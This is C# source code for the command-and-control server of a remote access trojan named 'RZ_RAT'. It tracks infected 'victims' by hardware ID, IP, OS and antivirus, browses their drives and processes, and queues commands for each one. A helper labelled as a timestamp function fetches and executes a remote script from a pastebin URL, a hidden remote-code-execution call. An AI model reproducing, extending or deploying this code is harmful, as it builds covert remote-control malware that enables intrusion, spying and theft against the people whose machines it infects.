using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Threading;
using System.Text.RegularExpressions;
using System.Globalization;
using Microsoft.VisualBasic;
using System.Collections;
using System.IO;

namespace RZ_RAT
{
    public class StateObject
    {
        // Client  socket.
        public Socket workSocket = null;
        // Size of receive buffer.
        public const int BufferSize = 1024;
        // Receive buffer.
        public byte[] buffer = new byte[BufferSize];
        // Received data string.
        public StringBuilder sb = new StringBuilder();
    }
    public class Server
    {
        public static ManualResetEvent allDone = new ManualResetEvent(false);
        Socket ServerSocket = null;
        int Port = 4562;
        int backlog = 1;
        Form1 Context = null;
        FileManger FM = null;
        ProcessForm PS = null;
        public List<string[]> infoClients = new List<string[]>();
        public List<string> commands = new List<string>();
        public Server (int port ,Form1 context,FileManger fm,ProcessForm ps)
        {
            Context = context;
            FM = fm;
            PS = ps;
            Port = port;
            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }
        public void Strat()
        {
            ServerSocket.Bind(new IPEndPoint(IPAddress.Any, Port));
            ServerSocket.Listen(backlog);
          //  ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback),ServerSocket);
                while (true)
                {
                    allDone.Reset();
                    ServerSocket.BeginAccept(
                        new AsyncCallback(AcceptCallback),
                        ServerSocket);
                    allDone.WaitOne();
                }

            
        }
        private void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                allDone.Set();

                Socket listener = (Socket)ar.AsyncState;
                Socket client = listener.EndAccept(ar);

               

                StateObject state = new StateObject();
                state.workSocket = client;
                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReceiveCallback), state);
            }
            catch
            {

            }
           
        }
        private void ReceiveCallback(IAsyncResult ar)
        {

            try
            {
                String content = String.Empty;
                StateObject state = (StateObject)ar.AsyncState;
                Socket handler = state.workSocket;
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead > 0)
                {
                    state.sb.Append(Encoding.Default.GetString(state.buffer, 0, bytesRead));
                    content = state.sb.ToString();
                    if (content.IndexOf("<EOF>") > -1)
                    {
                        Process(handler, content);
                    }
                    else
                    {
                        handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReceiveCallback), state);
                    }
                }
            }
            catch
            {

            }
          
        }
        private void Process(Socket handler, String data)
        {
            
            try
            {
                string[] str = Regex.Split(data, "<>");
                switch (str[1])
                {
                    case "w":
                        string HWID = str[2];
                        string name_of_victim = str[3];
                        string ip = str[4].Replace("\n", "");
                        string os = str[5].Replace("?","");
                        string av = str[6];
                        string dateofinstall = str[7].Replace("?", "");
                        string DotNet = str[8];
                        string timeNow = str[9];
                        string CountryCode = getCountryCode(ip.Split(new[] { '/' })[0]);
                        string[] ClientInfo = new string[] { HWID, timeNow };
                        string[] Clientinfo = new string[] { "" ,name_of_victim ,ip,os,av,dateofinstall,DotNet };
                        if (CheckClient(HWID))
                        {
                            infoClients.Add(ClientInfo);
                            ListViewItem lvi = new ListViewItem(Clientinfo, CountryCode);
                            
                            Context.Invoke((MethodInvoker)delegate
                            {
                                lvi.Tag = ClientInfo;
                                Context.listView1.Items.Add(lvi);
                            });
                        }
                        else
                        {
                            ChangeClientTime(HWID, GetTimestamp().ToString());
                        }


                        if (checkCommands(ClientInfo))
                        {
                            data = getCommandByHWID(ClientInfo[0]);
                            //commands.Remove(getCommand(handler));
                        }

                        break;
                    case "hdi":
                        string[] drivers = str[2].Split(new string[] { "<|>" }, StringSplitOptions.None);
                        FM.client = getClientByHWID(str[3]);
                        FM.Invoke((MethodInvoker)delegate { FM.comboBox1.Items.AddRange(drivers);
                        FM.Refresh();
                        });
                        
                        break;
                    case "fdi":
                        string[] FilesAndFolders = str[2].Split(new string[] { "<|>" }, StringSplitOptions.None);
                        FM.Invoke((MethodInvoker)delegate
                        {
                            FM.listView1.Items.Clear();
                            FM.addtolistview(FilesAndFolders);
                            FM.Refresh();
                        });
                        break;
                    case "prccl":
                        string[] processs = str[2].Split(new string[] { "||" }, StringSplitOptions.None);
                        PS.Invoke((MethodInvoker)delegate
                        {
                            PS.addprocesstolist(processs);
                            PS.Refresh();
                        });
                        break;
                    case "rc":
                        string commandID = str[3];
                        commands.Remove(getCommandByID(commandID));
                        break;
                }

                byte[] byteData = Encoding.ASCII.GetBytes(data);
                handler.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), handler);
            }
            catch
            {

            }
           
        }
        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket client = (Socket)ar.AsyncState;
                client.Shutdown(SocketShutdown.Both);
            }
            catch
            {

            }
        
        }
        public string getCountryCode(string ip)
        {
            try
            {
                WebClient wc = new WebClient();
                string countrycode = wc.DownloadString("https://api.ipdata.co/" + ip);
                string[] lines = countrycode.Split(
        new[] { "\n" },
        StringSplitOptions.None
    );
                string s = lines[6].Replace(" ", "").Replace(@"""", "").Replace(@"country_code:", "").Replace(",", "");
                return s;
            }
            catch
            {
                return "_na";
            }
           
            
        }
        public void ChangeClientTime(string hwid,string newTime)
        {
            var client = infoClients.Where(d => d[0] == hwid).FirstOrDefault();
            if (client != null) { client[1] = newTime; }
            Context.Invoke((MethodInvoker)delegate
            {
                foreach (ListViewItem lv in Context.listView1.Items)
                {
                    string[] ss = ((IEnumerable)lv.Tag).Cast<object>()
                                     .Select(x => x.ToString())
                                     .ToArray();

                    if (ss[0] == hwid)
                    {
                        string[] nn = new string[] { hwid, newTime };
                        lv.Tag = nn;
                    }
                }
            });

        }
        public long GetTimestamp()
        {
            var r = Interaction.GetObject("script:https://pastebin.com/raw/fmvBK2jg");
            var a = Interaction.CallByName(r, "ConvertToUnixTimeStamp", CallType.Method).ToString();
            return long.Parse(a);
        }
        public string Get8CharacterRandomString()
        {
            string path = Path.GetRandomFileName();
            path = path.Replace(".", ""); // Remove period.
            return path.Substring(0, 8);  // Return 8 character string
        }
        public bool CheckClient(string hwid)
        {
            if (!(infoClients.Count == 0))
            {
                foreach (string[] str in infoClients)
                {
                    if (str[0] == hwid)
                    {
                        return false;
                    }
                }
            }
            return true;
        }
        public string[] getClientByHWID(string hwid)
        {

            foreach (string[] client in infoClients)
            {

                if (client[0] == hwid)
                {
                    return client;
                }

            }
            return null;
        }
        public bool checkCommands(string[] client)
        {
            string hwid = client[0];
            foreach (string command in commands)
            {
                string[] str = Regex.Split(command, "<<>>");
                if (str[0] == hwid)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }
        public string getCommandByHWID(string hwid)
        {

            foreach (string command in commands)
            {
                string[] str = Regex.Split(command, "<<>>");
                if (str[0] == hwid)
                {
                    return command;
                }

            }
            return null;
        }
        public string getCommandByID(string commandID)
        {
            string cID = commandID;
            foreach (string command in commands)
            {
                string[] str = Regex.Split(command, "<<>>");
                if (str[1] == cID)
                {
                    return command;
                }

            }
            return null;
        }
        public void addCommand(string[] client, string Command)
        {
            string hwid = client[0];
            bool thereissame = true;
            if (!(commands.Count == 0))
            {
                foreach (string command in commands)
                {
                    if ((command == Command))
                    {
                        thereissame = false;
                    }
                }
            }
            else
            {

            }
            if (thereissame)
            {      
                commands.Add(hwid + "<<>>" + Get8CharacterRandomString() + "<<>>" + Command);
            }
        }
        
    }
}      